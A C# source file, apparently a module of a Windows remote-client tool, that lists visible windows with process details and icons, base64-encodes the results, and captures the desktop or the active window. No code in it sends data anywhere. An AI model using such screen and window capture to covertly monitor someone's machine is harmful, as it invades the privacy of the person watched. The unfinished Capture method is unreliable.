using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace winClient48
{
    public class FuncWindow
    {
        //CAPTURE WINDOW
        [DllImport("gdi32.dll")]
        static extern bool BitBlt(IntPtr hdcDest, int nxDest, int nyDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);

        [DllImport("gdi32.dll")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int width, int nHeight);

        [DllImport("gdi32.dll")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);

        [DllImport("gdi32.dll")]
        static extern IntPtr DeleteDC(IntPtr hdc);

        [DllImport("gdi32.dll")]
        static extern IntPtr DeleteObject(IntPtr hObject);

        [DllImport("user32.dll")]
        static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll")]
        static extern IntPtr GetWindowDC(IntPtr hWnd);

        [DllImport("user32.dll")]
        static extern bool ReleaseDC(IntPtr hWnd, IntPtr hDc);

        [DllImport("gdi32.dll")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hObject);

        [DllImport("user32.dll")]
        public static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

        [DllImport("user32.dll")]
        public static extern bool IsIconic(IntPtr hWnd);

        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll")]
        public static extern bool SetForegroundWindow(IntPtr hWnd);

        [StructLayout(LayoutKind.Sequential)]
        public struct RECT
        {
            public int Left;
            public int Top;
            public int Right;
            public int Bottom;
        }

        const int SRCCOPY = 0x00CC0020;

        const int CAPTUREBLT = 0x40000000;

        // Constants for ShowWindow function
        private const int SW_RESTORE = 9;
        private const int SW_MINIMIZE = 6;

        //GET WINDOW ICON
        public const int GCL_HICONSM = -34;
        public const int GCL_HICON = -14;

        public const int ICON_SMALL = 0;
        public const int ICON_BIG = 1;
        public const int ICON_SMALL2 = 2;

        public const int WM_GETICON = 0x7F;

        public static IntPtr GetClassLongPtr(IntPtr hWnd, int nIndex)
        {
            if (IntPtr.Size > 4)
                return GetClassLongPtr64(hWnd, nIndex);
            else
                return new IntPtr(GetClassLongPtr32(hWnd, nIndex));
        }

        [DllImport("user32.dll", EntryPoint = "GetClassLong")]
        public static extern uint GetClassLongPtr32(IntPtr hWnd, int nIndex);

        [DllImport("user32.dll", EntryPoint = "GetClassLongPtr")]
        public static extern IntPtr GetClassLongPtr64(IntPtr hWnd, int nIndex);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = false)]
        static extern IntPtr SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

        //GET ALL WINDOW
        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool EnumWindows(EnumWindowsProc enumProc, IntPtr lParam);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern int GetWindowTextLength(IntPtr hWnd);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool IsWindowVisible(IntPtr hWnd);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);

        [DllImport("kernel32.dll")]
        public static extern bool IsWow64Process(IntPtr hProcess, out bool isWow64);

        [DllImport("user32.dll")]
        public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);

        public delegate bool EnumWindowsProc(IntPtr hWnd, int lParam);

        public string GetWindow()
        {
            List<string> result = new List<string>();
            EnumWindows((hWnd, lParam) =>
            {
                int length = GetWindowTextLength(hWnd);
                if (length > 0)
                {
                    if (IsWindowVisible(hWnd))
                    {
                        StringBuilder sb = new StringBuilder(length + 1);
                        GetWindowText(hWnd, sb, sb.Capacity);
                        string window_title = sb.ToString();

                        uint process_id;
                        GetWindowThreadProcessId(hWnd, out process_id);

                        try
                        {
                            Process process = Process.GetProcessById((int)process_id);

                            bool is_Wow64;
                            IsWow64Process(process.Handle, out is_Wow64);
                            string exe_path = Global.WMI_QueryNoEncode($"select ExecutablePath from win32_process where ProcessId = {process_id}")[0];
                            result.Add($"" +
                                $"{Crypto.b64E2Str(window_title)}," + //WINDOW TITLE
                                $"{Path.GetFileName(exe_path)}," + //PROCESS FILE NAME
                                $"{process_id}," + //PROCESS ID
                                $"{process.Handle}," + //PROCESS HANDLE
                                $"{Crypto.b64E2Str(exe_path)}," + //PROCESS EXECUTABLE PATH
                                $"{ExtractIcon(exe_path)}" //ICON GetAppIcon(process.Handle)
                                );
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.Message);
                        }
                    }
                }
                return true;
            }, IntPtr.Zero);

            return string.Join(";", result.ToArray());
        }

        public string ExtractIcon(string path)
        {
            using (Icon icon = Icon.ExtractAssociatedIcon(path))
            {
                return Global.BitmapToBase64(icon.ToBitmap());
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct Rect
        {
            public int Left;
            public int Top;
            public int Right;
            public int Bottom;
        }

        [DllImport("user32.dll")]
        private static extern IntPtr GetWindowRect(IntPtr hWnd, ref Rect rect);

        public static Image CaptureDesktop()
        {
            return CaptureWindow(GetDesktopWindow());
        }

        public static Bitmap CaptureActiveWindow()
        {
            return CaptureWindow(GetForegroundWindow());
        }

        public static Bitmap CaptureWindow(IntPtr handle)
        {
            var rect = new Rect();
            GetWindowRect(handle, ref rect);
            var bounds = new Rectangle(rect.Left, rect.Top, rect.Right - rect.Left, rect.Bottom - rect.Top);
            var result = new Bitmap(bounds.Width, bounds.Height);

            using (var graphics = Graphics.FromImage(result))
            {
                graphics.CopyFromScreen(new Point(bounds.Left, bounds.Top), Point.Empty, bounds.Size);
            }

            return result;
        }

        [DllImport("user32.dll")]
        private static extern int GetWindowThreadProcessId(IntPtr hWnd, out int processId);


        public string Capture(IntPtr handle)
        {
            if (handle == IntPtr.Zero)
                return null;

            MessageBox.Show(handle.ToString());
            ShowWindow(handle, SW_RESTORE);
            if (!SetForegroundWindow(handle))
            {

            }

            return "";
        }
    }
}
